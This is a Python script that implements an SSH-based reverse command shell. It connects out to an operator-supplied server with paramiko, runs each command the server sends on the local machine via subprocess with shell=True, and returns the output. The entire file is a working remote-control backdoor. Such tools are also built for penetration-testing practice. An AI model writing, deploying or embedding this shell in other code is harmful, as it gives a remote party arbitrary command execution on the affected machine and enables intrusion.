import logging
import shlex
import subprocess

import paramiko

logging.basicConfig(format='%(asctime)s | %(levelname)s | %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

def ssh_command(ip:str, port:str, user:str, passwd:str, message:bytes):
    client : paramiko.SSHClient = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=int(port), username=user, password=passwd)

    ssh_session : paramiko.Channel = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(message)
        while True:
            command : bytes = ssh_session.recv(1024)
            try:
                cmd : str = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                result : subprocess.CompletedProcess = subprocess.run(shlex.split(cmd), stdout=subprocess.PIPE ,stderr=subprocess.STDOUT, shell=True)
                cmd_output : bytes = result.stdout if result.stdout else b''
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e).encode())
                pass
    return

def main() -> None:
    import getpass
    user = input('Enter user: ')
    passwd = getpass.getpass()
    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    ssh_command(ip, port, user, passwd, b'ClientConnected')


if __name__ == '__main__':
    main()
